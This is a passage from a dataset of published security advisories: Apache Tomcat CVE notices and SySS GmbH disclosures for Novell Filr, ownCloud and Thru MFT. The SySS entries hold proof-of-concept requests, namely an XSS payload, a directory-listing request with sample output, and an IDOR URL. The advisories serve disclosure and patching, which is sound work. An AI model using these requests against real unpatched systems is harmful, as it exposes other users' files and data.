(9.0.0.M2 has the fix but was not released)
- - Upgrade to Apache Tomcat 8.0.30 or later
- - Upgrade to Apache Tomcat 7.0.67 or later
(7.0.66 has the fix but was not released)
Credit:
This issue was discovered by the Apache Tomcat security team.
References:
[1] http://tomcat.apache.org/security-9.html
[2] http://tomcat.apache.org/security-8.html
[3] http://tomcat.apache.org/security-7.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJWyu+WAAoJEBDAHFovYFnnNasQANmHvs8L9RvbPSPvmR8sT9rc
nfoC64cVqVFx6G99+iskQ4SKL00zZk10gCNKvwu6aBW8Dv7U+sqoo09vtIVJ9qvD
9qBIaZMfnqMxMaHtonUj8E1/9GryquYNj7pWMf0tut2/RIvQq8/1tAtTgrzjVXG2
qtpB/ECBHQ53tJuPxRDakgav17Ok90DbAO4rsSdmCUwUg8NEYieNb6RG4eRSvuav
ffE2zaicXIHWLdnVEMpOWtum76+GMfS5B+zd03/OQmiJy+arVvGwyrn1ydKZI1JI
7gQT97SgLlI3iGtK3tc4S56tNQ9+K2oMp2B0qAceNG9MWimED9sC1aXoAARacoYI
c+cZdnhiRxsYycEdTXbNqhat+se6vKeXqgrsrr3CbNmaNl6siRZD/d+9PbmXh+0z
hHSC9tmG5ZAO3vS4wwHX+9qZlfdcQ2zAZnAnRZKtuRMgDphP+wszain4p+U82TV9
eshrfHzzN4R0kuBWXkl4Pf4KQd+ZCVmp8efXFcyXK2fV7FUmLRvwtZ43EPa77tRI
egiZcN/WEqGHODKNr/AGQYuiuEU7gm3hqnJlgDLpPzKF2ptkLcEh9/HYcW9yI1Kf
x+fKtcfr6jGjJRxFw5PRsHEO8ToE8w38mPmeLzQH3WRcoc+g5+BinbIe/fwMsVPM
cAK/Ln4UhXIcIM1f7h5M
=is2n
-----END PGP SIGNATURE-----"
3436,[SECURITY] CVE-2015-5174 Apache Tomcat Limited Directory Traversal,,CVE-2015-5174,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2015-5174 Apache Tomcat Limited Directory Traversal
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 6.0.0 to 6.0.44
- - Apache Tomcat 7.0.0 to 7.0.64
- - Apache Tomcat 8.0.0.RC1 to 8.0.26
- - Apache Tomcat 9 is not affected
- - Earlier, unsupported Tomcat versions may be affected
Description:
When accessing resources via the ServletContext methods getResource()
getResourceAsStream() and getResourcePaths() the paths should be limited
to the current web application. The validation was not correct and paths
of the form ""/.."" were not rejected. Note that paths starting with
""/../"" were correctly rejected.
This bug allowed malicious web applications running under a security
manager to obtain a directory listing for the directory in which the web
application had been deployed. This should not be possible when running
under a security manager. Typically, the directory listing that would be
exposed would be for $CATALINA_BASE/webapps.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 8.0.27 or later
- - Upgrade to Apache Tomcat 7.0.65 or later
- - Upgrade to Apache Tomcat 6.0.45 or later
Credit:
This issue was discovered by the Apache Tomcat security team.
References:
[1] http://tomcat.apache.org/security-9.html
[2] http://tomcat.apache.org/security-8.html
[3] http://tomcat.apache.org/security-7.html
[4] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJWyu+JAAoJEBDAHFovYFnnubgQAICDB8mbxG4KbSDT1YAcqjJd
lToWRjRKVd0UzIaOZFUmqV0Ap7o181xMfQpSfGZSAAukF7+zTcX33O+cklTkZaw/
yjprJSI942enkWlGygiJxIH8DUadGa62iTMyhXmpqLqkD5ura5sSNEdzir7aEnUw
P8vLdpmfbdUqNn9Qv1L27btm5+lU6OU+I8nBTB5ESyDxjhVrpc1d8GVcRaXh0mU4
56oeIAJg7O9ozXrIQa692K4pAV+VqZFb52Vwk3XiNENn0VjwM2W7PAqy+vtAfkLt
wt5SDVjoXuCW1jBTjTU+hmxzDziN0WzgVMgFsSVZg0lyU/H837e/bOOmNVA1dfGD
F6Ln40a1eYkZQ6eXK9SPmz36OnU/akM3+rcDEz9e9spvbe/c4oH5T3/yZwmsONSO
4G+9JyMCg/YKWl2+YIJSGGxO1khaLbXZvyvVwkpq0IzJZ/ZhTp7BQY+DYb4axVY3
QLBx6/XzoIRfLxf1lpvUakGw8P/0y2BPHRa+3b0WDJSElD4H6KAQd+q5vb1eyK6+
0bNPLYd9AyxYwaIuZMk2WtT+pQO0R3Ao6mVBNFk8K/YJj7msMsS4feI76I2LYLT0
WCLKWb/noO8oPmjYk6a7AZKncT9nASN+rCfbXedw6F+COxfVjuddbttsGza2oH7o
NKmM5mCdDfQztF3uOTnu
=aYIY
-----END PGP SIGNATURE-----"
3437,[SECURITY] CVE-2015-5351 Apache Tomcat CSRF token leak,,CVE-2015-5351,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2015-5351 Apache Tomcat CSRF token leak
Severity: Moderate
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 7.0.1 to 7.0.67
- - Apache Tomcat 8.0.0.RC1 to 8.0.31
- - Apache Tomcat 9.0.0.M1
Description:
The index page of the Manager and Host Manager applications included a
valid CSRF token when issuing a redirect as a result of an
unauthenticated request to the root of the web application. This token
could then be used by an attacker to construct a CSRF attack.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 9.0.0.M3 or later
(9.0.0.M2 has the fix but was not released)
- - Upgrade to Apache Tomcat 8.0.32 or later
(8.0.31 has the fix but was not released)
- - Upgrade to Apache Tomcat 7.0.68 or later
Credit:
This issue was discovered by the Apache Tomcat security team.
References:
[1] http://tomcat.apache.org/security-9.html
[2] http://tomcat.apache.org/security-8.html
[3] http://tomcat.apache.org/security-7.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJWyu97AAoJEBDAHFovYFnnkOkP/353AyMvuZvUHx7MJS6QmthF
ba5gOE0JprULz0VN9q6ilf1ZXE7myZiVxt0tWT9MvuQi+iMQUtarESxv/bnA1RSF
QsUoxgb4Wc6whrWIZUSXU9Vag5e7Ar/N3con0jzMLyopx0DBnOWNKQE/pp9Q6NPI
RRvOAWnq9nm3P9/D2x9AOl/LDaEFuPHW/GkfwuosNTLCRsWYqa1DN20cFnq/S8Iz
+jPpjkYsfIOoodLcX2t4B92alC3fRNPgG4Q8iuhwj3Umsw44D5/gdbmcEeEtqB4C
wYIQsyXdIA4JBSx44w8ihP+Z+pNt+MkxgXvhfGWu30JDELXRaXU0ItveeePTjRJR
u0jC09frTLKG7UnbVxitV7CgvMtEU6zGjaJsfEQcsES6q4s9qCzHCbp9alqQnW1i
5ZvabdyAkZVfdRsgurI6RAI1R/s2mWmXlIFjiKiYt3Qeyqkg5cFBNHctEw/DREiR
6GA6xmk06uKXUzv0SZUuvadWqkJ2JwVmd5Doe5IaoK4K069Ab5EJQSG1qQcXv6G2
LsYK4L9s+Zcp+m10unFX4v1CB8UnVPKw33intlvE7/6r0yBOaigtFHqV+ifuUdOO
bkENBx8Gp/HAx0VCpwhYP2AKkoSSqSOktsv/iBokWfIrsUG304uGoa3rWsAIcGCx
I/Yy6rJBLqfrQj4qFtc3
=bm3r
-----END PGP SIGNATURE-----"
3438,[SECURITY] CVE-2016-0706 Apache Tomcat Security Manager bypass,,CVE-2016-0706,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2016-0706 Apache Tomcat Security Manager bypass
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 6.0.0 to 6.0.44
- - Apache Tomcat 7.0.0 to 7.0.67
- - Apache Tomcat 8.0.0.RC1 to 8.0.30
- - Apache Tomcat 9.0.0.M1
- - Earlier, unsupported Tomcat versions may be affected
Description:
The StatusManagerServlet could be loaded by a web application when a
security manager was configured. This servlet would then provide the web
application with a list of all deployed applications and a list of the
HTTP request lines for all requests currently being processed. This
could have exposed sensitive information from other web applications
such as session IDs to the web application.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 9.0.0.M3 or later
(9.0.0.M2 has the fix but was not released)
- - Upgrade to Apache Tomcat 8.0.32 or later
(8.0.31 has the fix but was not released)
- - Upgrade to Apache Tomcat 7.0.68 or later
- - Upgrade to Apache Tomcat 6.0.45 or later
Credit:
This issue was discovered by The Apache Tomcat Security Team.
References:
[1] http://tomcat.apache.org/security-9.html
[2] http://tomcat.apache.org/security-8.html
[3] http://tomcat.apache.org/security-7.html
[4] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJWyu9qAAoJEBDAHFovYFnny/0P/0VtkiCt56FeS3I42BlvjAne
w/oqurmk/XoF/gof+VYxYuNOXMIwvgyGMjj21kZf+n2DjINXLHp9VFZ/APeSJ8kL
XcnTL1EBK1JBdxsieIhGAfLMeDO04wO3uuorJHwJIBbl4ymh7N4A2fgciKgCmNyB
y22TPT5Hz7iFCU8Ij6xsYJERpveUrenenAqbgjdcpILydbBoTqmZtZtWmPOFki90
cZo/2D0Av4H4SKh1PuCkzjk2DFXfyXcq+tDaX8dizPinQMQsbAX63BoYy5LrfWrJ
epgY9Q0QziOyp7b5Z72AjQ3RJR7yZS/iT3wb37jceI3Dq/mpkWFggqEGkSpFdGX7
AhoqVXjFw9eakjst0k5LZ29+dD8Fqz+2umXlRwelsxInLNgDk67Z2XehqkWWb85b
64PFh3ZYj/8CxxV6ErGq0bBhpCsNHZffEzOT/Ebldjn/afHajne3Yd9SZEbbZO3U
ejCSG2UziJ4t4mygnGyWaRCgKtjCrejzDZYicOICJEDE8enaPbNs0Ka8lR8fh21y
U3avzYIu7MosqvqoEAleMkjXySWSufqGF0ugbtsZx1lisl9Zax0LfXbq5sLmdNMS
fXhxu/1RfHfPS7NUP9YYs5OdWxCxecD/kiaxc3ArVVPdgAMSwlEyI59gSD/y7XPd
fitNMHbOMz6qG/uxVfH0
=6KO+
-----END PGP SIGNATURE-----"
3439,[SECURITY] CVE-2016-0714 Apache Tomcat Security Manager Bypass,,CVE-2016-0714,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2016-0714 Apache Tomcat Security Manager Bypass
Severity: Moderate
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 6.0.0 to 6.0.44
- - Apache Tomcat 7.0.0 to 7.0.67
- - Apache Tomcat 8.0.0.RC1 to 8.0.30
- - Apache Tomcat 9.0.0.M1
- - Earlier, unsupported Tomcat versions may be affected
Description:
Tomcat provides several session persistence mechanisms. The
StandardManager persists session over a restart. The PersistentManager
is able to persist sessions to files, a database or a custom Store. The
Cluster implementation persists sessions to one or more additional nodes
in the cluster. All of these mechanisms could be exploited to bypass a
security manager. Session persistence is performed by Tomcat code with
the permissions assigned to Tomcat internal code. By placing a carefully
crafted object into a session, a malicious web application could trigger
the execution of arbitrary code.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 9.0.0.M3 or later
(9.0.0.M2 has the fix but was not released)
- - Upgrade to Apache Tomcat 8.0.32 or later
(8.0.31 has the fix but was not released)
- - Upgrade to Apache Tomcat 7.0.68 or later
- - Upgrade to Apache Tomcat 6.0.45 or later
Credit:
This issue was discovered by The Apache Tomcat Security Team.
References:
[1] http://tomcat.apache.org/security-9.html
[2] http://tomcat.apache.org/security-8.html
[3] http://tomcat.apache.org/security-7.html
[4] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJWyu9PAAoJEBDAHFovYFnnllEQAMj38sm4FeeXJ2XOK/ODpj2J
SLK0VMib2gjRmMfuH15OPyYBIHPaWVD4E3ONiLz/2F9oqVAYfvswQnLfNrJ9k8oF
K+ETBoWfyODb8QddYQOd3JpDslrOLPscve6dgnkx/R8hZSPOvsmo8IIG4Bwh5VQM
rkAct8EFGpVuQ9ou59F8xSx7fhRMHhNKt8XwsuBIj43MwFv5P8rHhNJDbgC8hSP7
w8yKwrQ7alfeuzwQPegf11YEcauPog4TnD3JAuufcuPQefvDHRAIoKNRCwyvFbRC
rVHdsV5AehWaKKHj9Yu2IJB88s+0wXWlH01hG+wYl1jSVxs3CHhhP0FS55vwItWP
Igl26iz33esPlzQaVyWf5jOUOYfF0tZel4bDFcQrIQASJKS2vxCuOBgUhr+bReMD
I8W1A78EdGXm5IGqmPqHNXn+qAQKfs352eVFiS4vM+5n6wdVThxRzTIt/Op0iz8k
rOIm05kkZQedh7utUy4iW59MKHr9xGRQRI1r4/sdKHDIRSlzsfzJVrATqqLPxukg
QhG3LL0fO+kKLb526GZOlTaAcT7hM2wdYkLytiUItpMUR8ZfozqIS/nRUPmCfDgW
8QFRZEYIgETUYELbnj9chx0NJOkSH9OICV1U7EergsKsdpXN8uCDRy609ufSPn+W
M6wXyzp1l4aE2hnn22gZ
=OQbe
-----END PGP SIGNATURE-----"
3444,[SYSS-2015-055] Novell Filr - Cross-Site Scripting (CWE-79),CWE-79,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-055
Product: Novell Filr
Vendor: Novell
Affected Version(s): 1.2.0 build 846
Tested Version(s): 1.2.0 build 846
Vulnerability Type: Cross-Site Scripting (CWE-79)
Risk Level: Medium
Solution Status: Fixed
Vendor Notification: 2015-09-17
Solution Date: 2015-12-16
Public Disclosure: 2016-01-12
CVE Reference: Not assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Novell's Filr is an application for mobile file access and collaborative
file sharing [1]. High security is an important aspect of the application.
The SySS GmbH could find two reflected cross-site scripting
vulnerabilities in the Filr Web application.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified that it is possible to inject JavaScript code
via the parameter ""sendMailLocation"".
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
When looking at the details for a certain file, it is possible to send
an e-mail to a colleague. When the following HTTP POST request is sent
POST /ssf/a/do?p_name=ss_forum&p_action=1&binderId=413&action=send_entry_email&ssUsersIdsToAdd=163&entryId=1243&novl_url=1 HTTP/1.1
Host: [host]
Referer: https://[host]/ssf/a/do?p_name=ss_forum&p_action=1&binderId=413&action=send_entry_email&ssUsersIdsToAdd=163&entryId=1243&novl_url=1
Cookie: JSESSIONID=[sessionid]
Content-Length: 684
sendMailLocation=https%3A%2F%2F[host]%2Fssf%2Fa%2Fdo%3Fp_name%3Dss_forum%26p_action%3D1%26binderId%3D422%26action%3Dsend_entry_email%26ssUsersIdsToAdd%3D163%26entryId%3D1232%26novl_url%3D17""%3balert(1)%2f%2f&ssUsersIdsToAdd=163&addresses=[email address]&self=on&users=+163+&searchText=&searchText_type=&searchText_selected=&groups=&searchText=&searchText_type=&searchText_selected=&ccusers=&searchText=&searchText_type=&searchText_selected=&ccgroups=&searchText=&searchText_type=&searchText_selected=&bccusers=&searchText=&searchText_type=&searchText_selected=&bccgroups=&searchText=&searchText_type=&searchText_selected=&subject=[subject]&mailBody=%3Cp%3E[content]%3C%2Fp%3E&okBtn=Senden
an e-mail status is provided. When the button to return to the previous
page is clicked, the JavaScript code is executed.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
According to information by Novell, ""a fix for this issue is available in
the Filr 1.2 Hot Patch 4, available via the Novell Patch Finder"".
https://www.novell.com/support/kb/doc.php?id=7017078
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-09-15: Vulnerability discovered
2015-09-17: Vulnerability reported to vendor
2015-12-16: Vulnerability published by vendor
2016-01-12: Vulnerability published by SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Novell Filr Web site
https://www.novell.com/products/filr/
[1] SySS GmbH, SYSS-2015-055
https://www.syss.de/advisories/SYSS-2015-055.txt
[2] SySS GmbH, SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of
the SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJWlR6MAAoJEAylhje9lv8qvRYP/RVh7yLzPthf8I2uM1nfGPwG
AsL+ajdHXVbWJrjHpaIUNwj8zpwQGZ2xVODI6vbt65u5W0gFL7M7HBNUizc+1M5Y
iAUcZXXdDMXcatZfQAW9UDH3ukuz99QIOUHQjFCdxhj+8smX+N+WA7XXEOTS4t+h
8ZvJPNJYEjSxcT8Bw8yt2EFJQaXENbS57MRMuYHQlHPSwOlKMxgNbkGNcfoz50Bp
JCt4u6XCoa1vj4rueAeXLfceyThbBQqdZUo5PGrN+v7N0d+CMYTQ4qp/2J8JSmZE
kCFobKP2pcIpXFFitw+cnzx/pFiK7cnmSxn82mA12Wh8m7knfBTaxqW4mmPsiGzk
KmWvq9JMgI+zy6xei10dzpoxQuDiWXG+SKeP236iHEBo77FpZU6HtIpYM6anAe/A
obr1u0iN8gVBT2dsuXbfeA2MIbwZvkLuTycFpTofL+nQzZM1pIh1QKXQ4rpv6Gjs
RQbliQJmBuEznT/JBceEML3X5VO32jNw0x6sMG8QFXhHAKFNo93IhsMvX0Opfq9C
qeyT3TYrb/kcFaLK/wD6stDCiTMPsEkki1xgodcSKjsfUNcDUvt1lKU6VUBoKvm5
5UfZEqwmOb2XjJNmKED0cedcXKmkkhLK2nNoDEMP5IPyWlyLeszP/1SazfPAVZMU
XJuH8TA6YBt+CyUg3WNZ
=lvzi
-----END PGP SIGNATURE-----"
3445,[SYSS-2015-062] ownCloud - Information Exposure Through Directory Listing (CWE-548),CWE-548,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-062
Product: ownCloud
Manufacturer: ownCloud Inc., Community
Affected Version(s): ownCloud <= 8.2.1, <= 8.1.4, <= 8.0.9
Tested Version(s): 8.1.1, 8.1.4
Vulnerability Type: Information Exposure Through Directory Listing (CWE-548)
Risk Level: Medium
Solution Status: Fixed
Manufacturer Notification: 2015-07-17
Solution Date: 2015-12-23
Public Disclosure: 2016-01-05
CVE Reference: CVE-2016-1499
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
ownCloud is a software suite for creating and using file hosting
services.
The ownCloud Web site describes the software as follows (see [1]):
""ownCloud is a self-hosted file sync and share server. It provides access
to your data through a web interface, sync clients or WebDAV while
providing a platform to view, sync and share across devices easily � all
under your control. ownCloud�s open architecture is extensible via a
simple but powerful API for applications and plugins and it works with
any storage.""
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
ownCloud is vulnerable to information exposure through directory
listing. It is possible with a normal user to get information about
the complete directory structure and included files of all users.
The 'force' parameter in the script (index.php/apps/files/ajax/scan.php)
can easily be manipulated, by setting its value to 'true'.
This vulnerability can potentially be used for denial-of-service attacks
if the selected directory is deep enough, because to index many
directories requires high computational effort. In addition, sensitive
information from other users is exposed.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
With the following HTTP GET request, it is possible to see the
directories of other users.
GET /index.php/apps/files/ajax/scan.php?force=true&dir=&requesttoken=<VALIDREQUESTTOKEN> HTTP/1.1
Host: [HOST]
Accept: text/event-stream
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: [REFERER]
Cookie: [COOKIES]
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Server response (shortened):
event: user
data: ""[ID]""
event: folder
data: ""/""
event: count
data: 21
event: count
data: 42
event: count
data: 63
event: folder
data: ""/[ID]""
event: folder
data: ""/[ID]/cache""
event: folder
data: ""/[ID]6/files""
event: folder
data: ""/[ID]/files_encryption""
[...]
event: folder
data: ""/[ID]/files_encryption/keys/files/[FILENAME].zip""
event: folder
data: ""/[ID]/files_encryption/keys/files/[FILENAME].zip/OC_DEFAULT_MODULE""
event: folder
data: ""/[ID]/files_encryption/keys/files/[FILENAME].pptx""
[...]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
According to information by ownCloud, the described security issue has
been fixed in software releases:
� ownCloud 8.2.2
� ownCloud 8.1.5
� ownCloud 8.0.10
Please contact the manufacturer for further information or support or
visit https://owncloud.org/security/advisory/?id=oc-sa-2016-002.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-11-17: Vulnerability reported to manufacturer
2015-12-23: Patch published by manufacturer
2016-01-05: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] ownCloud, Web Site
https://owncloud.org/
[2] SySS Security Advisory SYSS-2015-062
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-062.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is"" and
without warranty of any kind. Details of this security advisory may be updated
in order to provide as accurate information as possible. The latest version of
this security advisory is available on the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJWlR69AAoJEAylhje9lv8qjHMQAJWT/wIjZTFwkBdQtkLNHXuP
+roCh4sCsEwaykZDFeILIgjpx4cWm9lga2/C/B0fj/UDDQrgInfEi7CmBZ32u/0m
iXcV250/Yy9+lYasVpHRxKU4ef3b3rkK4Yf3thaMQPO1KP5LvRXyL//I597mv4Co
e/gVn4CHZASmcj1hq9AQqbXi7t68pe6kjhWYfs1/qNbRd9g8b8o1u+e1bF2E4J+Z
t4PKOxuNgzZOy7ZmxRLO3dbFVFLLUVG6XxoqVk2fU5l9WUm6cO3d5md7m+zEoo9s
xLTEsRIzZ/KccPsNMHmPUMNOXsxh71a4BrkA1y4BYjyXn2KrAMLHEWa7H0SeE9yo
c6QmGf6STdvu8mgt9fCJvN7U3h2pllyq5rJi/MEPHZB4Q6rt1Kk8SNuel+C6zFJK
/8g8qVbwz3IW3Iluz6n8mVSZfKfHPooOX6C7NcK2tIFXNBWgrIhKVXWVHsZyDUtc
ZdjqvIg0YxElLBHLei3OTDTmEDV6RLbe5aIhMWMLzuG6kSY4ZXrGQ1BKhh5Z5t4l
g/2+f/bHSZouZ9a6UCGJWXb1sGofcbfb/9pK7FirIn8M8OI/FyvKfQiVh2gQPZtw
0/J4pvREv/09r+tIK/VWjz0UR+eZp81qhljZlhEHWD/fPYBgRgXFRHfh7TzeOrVK
a8dhY20fJ7J+0dPBSoAp
=gYnI
-----END PGP SIGNATURE-----"
3446,[SYSS-2015-064] Thru Managed File Transfer Portal 9.0.2 - Insecure Direct Object Reference (CWE-932),CWE-932,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-064
Product: Thru Managed File Transfer Portal
Manufacturer: Thru
Affected Version(s): 9.0.2
Tested Version(s): 9.0.2
Vulnerability Type: Insecure Direct Object Reference (CWE-932)
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2015-12-09
Solution Date: 2016-01-22
Public Disclosure: 2016-02-15
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Thru Managed File Transfer Portal is a web based file transfer
application. According to the Thru website [1], the application aims to
offload large file transfer to a single platform, to protect files, to
replace FTP servers and to allow access to files anytime, anywhere.
The Thru Managed File Transfer application allows authenticated users to
access the favourite contacts list of other users.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified a vulnerability in the functionality to display
the favourite contacts list. These lists include email addresses of
other users and can be directly accessed using the correct URL.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The favourite contacts lists of different users can be accessed when a
user has a valid user account via the following URL
https://[HOST]/App/asp/list_details.asp?listid=[ID]
Here, merely the numeric parameter ""listid"" needs to be manipulated.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The reported security vulnerability has been fixed in a new software
release. Update to the new software version.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-12-09: Vulnerability discovered
2015-12-09: Vulnerability reported to manufacturer
2016-01-22: Manufacturer announced update
2016-02-15: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Thru Homepage
http://www.thruinc.com
[2] SySS Security Advisory SYSS-2015-064
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-064.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJWwbeJAAoJEAylhje9lv8qrtsP/2WwR4gbSY5C7Xwynt5LaTY+
TN38LpHGD4TwP6mS9gk0OIzHJmywUrSAQvbnEI0gC1kiOdFyUwOdaB2Q9JlVyx4a
lT9ErbTEtj0xu923tVKXdj+uKtgH+ZzdoMzbUVWMxkNC5kKCCxOfyYJfFIbcBRxE
